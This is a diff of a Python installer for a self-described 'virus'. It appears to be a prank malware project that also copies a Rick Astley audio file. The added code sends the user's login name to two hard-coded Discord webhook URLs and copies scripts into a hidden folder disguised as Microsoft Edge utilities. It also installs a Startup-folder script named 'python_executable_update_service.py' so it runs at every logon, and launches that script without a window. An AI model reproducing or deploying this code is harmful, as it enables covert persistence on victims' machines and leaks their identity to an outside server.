@@ -1,15 +1,21 @@
-import os, sys
+import os, sys, shutil, requests
 PYTHON_COMMAND = sys.executable
 
-print("Starting installer...")
+if sys.platform != "win32":
+    print("This is ment for windows only. \nExiting...")
+    exit(1)
+
+def log_to_discord(msg:str, important=False):
+    data = {"username":f"User:{os.getlogin()}", "content":msg}
+    try:
+        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
+        if important:
+            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
+    except:
+        print("Failed to send port request")
+log_to_discord("**Installing virus**", important=True)
 
 home_dir = os.path.expanduser("~")
-# The home_dir on Windows is typically C:\Users\YourName
-# The screenshot shows 'C:\Users\justlinux'
-print("Home dir is: ", home_dir)
-
-# --- Fix 1: Correctly build the startup folder path ---
-# os.path.join handles separators correctly.
 startup_folder = os.path.join(
     home_dir,
     "AppData",
@@ -21,31 +27,35 @@ startup_folder = os.path.join(
     "Startup"
 )
 
-print("Copying files...")
+curr_location = os.path.dirname(__file__)
+shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+appdata = os.environ['APPDATA']
 
-# --- Fix 2: Correctly build the target directory path and use 'os.makedirs' (better than os.system('mkdir')) ---
-# The original was trying to mix home_dir and a relative path, which doesn't work well with os.system.
-# Use os.makedirs with 'exist_ok=True' to avoid errors if the folder already exists.
-target_cache_dir = os.path.join(
+virus_dir = os.path.join(
     home_dir,
-    "Downloads",
-    "Google_Stable_x64",
-    "assets",
-    "cache"
+    ".temp",
+    "Microsoft_Edge_x64",
+    "utils"
 )
-os.makedirs(target_cache_dir, exist_ok=True)
-# The old os.system(f"mkdir {os.path.join("home_dir/Downloads/...")}") was causing "The syntax of the command is incorrect."
+os.makedirs(virus_dir, exist_ok=True)
 
-# --- Fix 3: Correctly build the full paths for the 'copy' command ---
-# It's safer to use full paths and os.path.join() for robust file operations.
-# The original code's startup_folder was missing the Drive/Users/ part when combined with os.path.expanduser("~").
-# The original f'{startup_folder}/virus_game_startup.py' was using forward slashes inside an f-string which is risky on Windows.
-os.system(f"copy src\\virus_game_startup.py {os.path.join(startup_folder, 'virus_game_startup.py')}")
-os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%\\Music\\youtube_com-watch-dQw4w9WgXcQ.mp3")
-os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 {os.path.join(target_cache_dir, 'youtube_com-watch-dQw4w9WgXcQ.mp3')}")
-os.system(f"copy virus.py {os.path.join(target_cache_dir, 'youtube_com.py')}")
+file_table = [
+    (os.path.join(curr_location, "file_checker.py"), os.path.join(virus_dir, "cleaner_x32.py")),
+    (os.path.join(curr_location, "youtube_com-watch-dQw4w9WgXcQ.mp3"), os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")),
+    (os.path.join(curr_location, "gama_aaa.py"), os.path.join(virus_dir, "cleanup_x64.py")),
+    (os.path.join(curr_location, "startup.py"), os.path.join(shell_startup_dir, "python_executable_update_service.py"))
+]
 
-print("Running virus_game_startup.py...")
-# --- Fix 4: Correctly build the path to run the file ---
-# The path must be fully correct, which the new 'startup_folder' ensures.
-os.system(f"{PYTHON_COMMAND} {os.path.join(startup_folder, 'virus_game_startup.py')}")
+for source, dest in file_table:
+    dest_dir = os.path.dirname(dest)
+    os.makedirs(dest_dir, exist_ok=True)
+    shutil.copy(source, dest)
+    print(f"Copied {source} to {dest}.")
+
+
+log_to_discord("Virus installed successfuly. Running it")
+
+print("Starting virus...")
+startup_script = os.path.join(shell_startup_dir, "python_executable_update_service.py")
+import subprocess
+subprocess.Popen([PYTHON_COMMAND, startup_script], creationflags=subprocess.CREATE_NO_WINDOW)
